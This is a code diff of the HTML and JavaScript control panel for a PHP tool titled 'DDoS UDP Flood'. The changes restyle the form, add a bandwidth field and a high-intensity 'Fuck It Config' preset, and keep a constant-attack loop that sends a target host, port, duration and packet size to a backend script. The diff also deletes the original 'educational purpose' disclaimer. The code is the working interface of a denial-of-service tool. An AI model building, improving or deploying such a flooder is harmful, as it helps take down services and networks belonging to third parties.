@@ -1,45 +1,89 @@
-<!--
-  ui.html
-   
-	Script to perform a DDoS UDP Flood by PHP
- 
-	This tool is written on educational purpose, please use it on your own good faith.
-  
-  GNU General Public License version 2.0 (GPLv2)
-	@version	0.1
-
--->
 <!DOCTYPE html>
 <html>
 <head>
 	<title>DDoS UDP Flood</title>
 	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 	<meta name="generator" content="Geany 1.23.1" />
+	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+	<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
+	<script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
 	<script>
-		// microAjax - https://github.com/TheZ3ro/microajax/
-		function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
+	// microAjax - https://github.com/TheZ3ro/microajax/
+	function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
 	</script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/js/materialize.min.js"></script>
 </head>
-<body>
-	<div id="ddos">
-		<button id="loadLag" onClick="javascript:lagConfig();">Lag config</button>
-		<button id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>
-		<br />
-		<label>Host:</label><input type="text" id="host"><br/>
-		<label>Port:</label><input type="number" id="port" max=65535 min=1 step=1 value=80><br/>
-		<label>Packet:</label><input type="number" id="packet" min=1 step=1><br/>
-		<label>Time:</label><input type="number" id="time" min=1 step=1 value=5><br/>
-		<label>Bytes:</label><input type="number" id="bytes" max=65000 min=1 step=1 value=65000><br/>
-		<label>Interval:</label><input type="number" id="interval" max=10000 min=1 step=1 value=10><br/>
-		<label>Pass:</label><input type="text" id="pass"><br/>
-		<button id="send" onClick="javascript:fire();">Fire!</button>
-		<br/><br/>
-		<label>Constant attack with smart delays</label>
-		<button id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
-		<button id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
-		<br/><br/>
-		<textarea id="log" rows="10" cols="50"></textarea>
-	</div>
+<body style='font-family="sans-serif"'>
+	<center>
+		<div id="ddos" style="padding: 5px;">
+			<br/>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" id="host">
+			    <label class="mdl-textfield__label" for="host">Host (Example: <?php echo getUserIP(); ?>)</label>
+				<span class="mdl-textfield__error">A Host is required</span>
+			 </div>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+				<input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="port">
+				<label class="mdl-textfield__label" for="port">Port (Example: 80)</label>
+				<span class="mdl-textfield__error">Input is not a number!</span>
+			</div>
+			<br/>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="packet">
+			    <label class="mdl-textfield__label" for="packet">Packet (Example: 5000)</label>
+				<span class="mdl-textfield__error">Input is not a number!</span>
+			</div>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="time">
+			    <label class="mdl-textfield__label" for="time">Time (Example: 60 (In seconds))</label>
+				<span class="mdl-textfield__error">Input is not a number!</span>
+			</div>
+			<br/>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="bytes">
+			    <label class="mdl-textfield__label" for="bytes">Bytes (Example: 65000)</label>
+				<span class="mdl-textfield__error">Input is not a number!</span>
+			</div>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="interval">
+			    <label class="mdl-textfield__label" for="interval">Interval (Example: 5)</label>
+				<span class="mdl-textfield__error">Input is not a number!</span>
+			</div>
+			<br/>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="bandwidth">
+			    <label class="mdl-textfield__label" for="pass">Bandwitdh (Example: 1 (~1MB))</label>
+				<span class="mdl-textfield__error">Input is not a number!</span>
+			</div>
+			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+			    <input class="mdl-textfield__input" type="text" id="pass">
+			    <label class="mdl-textfield__label" for="pass">Password</label>
+				<span class="mdl-textfield__error">Password is required</span>
+			</div>
+
+			<br/>
+			<br/>
+			<div>
+				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="loadLag" onClick="javascript:lagConfig();">Lag config</button>
+				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>
+				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="loadFuckIt" onClick="javascript:fuckItConfig();">Fuck It Config</button>
+			</div>
+			<br/>
+			<div>
+				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="send" onClick="javascript:fire();">Execute</button>
+			</div>
+			<br/>
+			<label>Constant attack with smart delays</label>
+			<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
+			<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
+			<br/>
+			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner" id="spinner"></div>
+			<br/>
+			<div class="mdl-textfield mdl-js-textfield">
+				<textarea class="mdl-textfield__input" type="text" rows="10" cols="50" id="log" style='width: auto;'></textarea>
+			</div>
+		</div>
+	</center>
 	<script>
 		var _log=document.getElementById("log");
 		var intervalHandler = null;
@@ -50,29 +94,52 @@
 			var time=document.getElementById("time").value;
 			var pass=document.getElementById("pass").value;
 			var bytes=document.getElementById("bytes").value;
+			var bandwidth=document.getElementById("bandwidth").value;
 			var interval=document.getElementById("interval").value;
 			
 			
 			if(host!="" && pass!=""){
 				inputLock(true);
-				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
+				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(bandwidth!=""? '&bandwidth='+bandwidth:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
 				console.log(url);
 				microAjax(url, function(result) { 
-				_log.value=result;
-				if(_log.value.includes("Wrong password")){
-					constantAttack(false);
-				}
-				if(intervalHandler == null){
-					inputLock(false);
-				}
+					_log.value=result;
+					if(_log.value.includes("Wrong password")){
+						constantAttack(false);
+					}
+					if(intervalHandler == null){
+						inputLock(false);
+					}
 				});
 			}
 			else{
-				_log.value = "Not all required parameters are filled correctly!"
+				passIsNotEmpty();
+				hostIsNotEmpty();
 			}
+		}
+
+		function passIsNotEmpty() {
+			var pass=document.getElementById("pass").value;
+			if(pass == ""){
+				document.getElementById("pass").parentElement.classList.add("is-invalid");
+			}
+		}
+
+		function hostIsNotEmpty() {
+			var host=document.getElementById("host").value;
+			if(host == ""){
+				document.getElementById("host").parentElement.classList.add("is-invalid");
+			}
+		}
+
+		function dirtyConfiger(){
+			document.getElementById("time").parentElement.classList.add("is-dirty");
+			document.getElementById("bytes").parentElement.classList.add("is-dirty");
+			document.getElementById("interval").parentElement.classList.add("is-dirty");
 		}
 		
 		function lagConfig(){
+			dirtyConfiger();
 			packet=document.getElementById("packet").value = "";
 			time=document.getElementById("time").value = "10";
 			bytes=document.getElementById("bytes").value = "1";
@@ -80,10 +147,19 @@
 		}
 		
 		function trafficConfig(){
+			dirtyConfiger();
 			packet=document.getElementById("packet").value = "";
 			time=document.getElementById("time").value = "5";
 			bytes=document.getElementById("bytes").value = "65000";
 			interval=document.getElementById("interval").value = "10";
+		}
+		
+		function fuckItConfig(){
+			dirtyConfiger();
+			packet=document.getElementById("packet").value = "";
+			time=document.getElementById("time").value = "120";
+			bytes=document.getElementById("bytes").value = "65000";
+			interval=document.getElementById("interval").value = "2";
 		}
 		
 		function constantAttack(status){
@@ -120,6 +196,7 @@
 					buttons[i].disabled = true;
 				}
 				document.getElementById("stopInterval").disabled = false;
+				document.getElementById("spinner").classList.add("is-active");
 			}
 			else{
 				for(i = 0;i < inputs.length;i++)
@@ -131,6 +208,7 @@
 					buttons[i].disabled = false;
 				}
 				document.getElementById("stopInterval").disabled = true;
+				document.getElementById("spinner").classList.remove("is-active");
 			}
 		}
 	</script>
